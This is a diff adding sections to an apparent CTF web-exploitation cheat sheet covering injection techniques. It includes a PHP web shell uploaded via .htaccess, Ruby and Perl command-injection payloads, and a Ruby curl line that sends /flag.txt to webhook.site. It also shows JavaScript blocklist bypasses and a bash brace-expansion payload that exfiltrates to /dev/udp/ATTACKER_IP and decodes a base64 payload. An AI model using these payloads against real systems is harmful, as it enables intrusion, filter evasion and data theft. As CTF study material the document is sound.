@@ -27,6 +27,8 @@
 - [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
 - [SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)](#sql-where-bypass-via-order-by-case-sharif-ctf-2016)
 - [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
+- [Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)](#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)
+- [Common Lisp Injection via Reader Macro (Insomnihack 2016)](#common-lisp-injection-via-reader-macro-insomnihack-2016)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
@@ -59,6 +61,8 @@ open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
 # Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
 ```
 
+**Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.
+
 ---
 
 ## Perl open() RCE
@@ -67,6 +71,8 @@ Legacy 2-argument `open()` allows command injection:
 open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 # Exploit: "|command_here" or "command|"
 ```
+
+**Key insight:** Perl's 2-argument `open()` interprets mode characters in the filename itself. A leading or trailing pipe (`|`) causes command execution. Any Perl CGI or backend that opens a user-supplied filename with the 2-arg form is vulnerable to RCE.
 
 ---
 
@@ -111,6 +117,8 @@ open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
 row['con'+'structor']['con'+'structor']('return this')()
 // Also: template literals, String.fromCharCode, reverse string
 ```
+
+**Key insight:** JavaScript `eval` blocklists filtering keywords like `require`, `process`, or `constructor` are bypassed with string concatenation in bracket notation. `['con'+'structor']` accesses `Function` constructor, which creates functions from strings -- equivalent to `eval` with no keyword to block.
 
 ---
 
@@ -174,6 +182,8 @@ def leak_char(known_prefix, position):
 
 ## File Upload to RCE Techniques
 
+**Key insight:** File upload vulnerabilities become RCE when you can control either the file extension (`.htaccess`, `.php`, `.so`) or the upload path (path traversal). Try uploading server config files (`.htaccess`), shared libraries (`.so`), or use log poisoning as fallback when direct code upload is blocked.
+
 ### .htaccess Upload Bypass
 1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
 2. Upload `rce.lol`: `<?php system($_GET['cmd']); ?>`
@@ -205,6 +215,8 @@ Upload zip with symlinks for file read, path traversal for file write.
 O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
 ```
 Replace cookie with base64-encoded malicious serialized data.
+
+**Key insight:** PHP cookies containing base64-encoded data are likely `unserialize()` targets. Craft a serialized object with a `path` property pointing to `flag.txt` or inject a POP chain for RCE. Decode the existing cookie first to identify the class name and property structure.
 
 ---
 
@@ -268,6 +280,8 @@ curl -sI "https://target/api/endpoint?seed=<seed>"
 curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
 ```
 
+**Key insight:** Flags and proof codes hidden in custom HTTP response headers (e.g., `x-flag`, `x-archive-tag`) are invisible in browser-rendered responses. Always inspect response headers with `curl -sI` or browser dev tools, especially for API endpoints.
+
 ---
 
 ## WebSocket Mass Assignment
@@ -275,6 +289,8 @@ curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
 {"username": "user", "isAdmin": true}
 ```
 Handler doesn't filter fields → privilege escalation.
+
+**Key insight:** WebSocket handlers that directly map JSON properties to objects without whitelisting allow mass assignment. Add privileged fields like `isAdmin`, `role`, or `balance` to the JSON payload -- if the server doesn't explicitly filter them, they overwrite the corresponding object properties.
 
 ---
 
@@ -373,6 +389,38 @@ mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
 ```
 
 **Key insight:** DNS records (PTR, TXT, MX) are an overlooked injection channel. Any application that resolves IPs/hostnames and incorporates the result into database queries is vulnerable. Control comes from setting up DNS records for attacker-owned domains or IP reverse DNS.
+
+---
+
+## Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)
+
+When spaces and common shell metacharacters (`$`, `&`, `\`, `;`, `|`, `*`) are filtered, use bash brace expansion and process substitution:
+
+```bash
+# Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
+{ls,-la,../..}
+
+# Exfiltrate via UDP when outbound TCP is blocked:
+<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)
+
+# Execute base64-encoded payload:
+<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
+```
+
+**Key insight:** Bash brace expansion `{a,b,c}` splits into space-separated tokens without requiring literal space characters. Combined with `/dev/udp/` or `/dev/tcp/` for exfiltration, this bypasses filters that block spaces and most shell metacharacters.
+
+---
+
+## Common Lisp Injection via Reader Macro (Insomnihack 2016)
+
+Lisp's `read` function evaluates `#.(expression)` reader macros at parse time. When an application uses `read` for user input (instead of `read-line`), arbitrary code execution is possible:
+
+```lisp
+#.(ext:run-program "cat" :arguments '("/flag"))
+#.(run-shell-command "cat /flag")
+```
+
+**Key insight:** Lisp's `read` treats data as code by design -- the `#.()` reader macro evaluates arbitrary expressions during parsing. This is analogous to SQL injection but for Lisp. Safe alternative: use `read-line` for string input, never `read` on untrusted data.
 
 ---
 
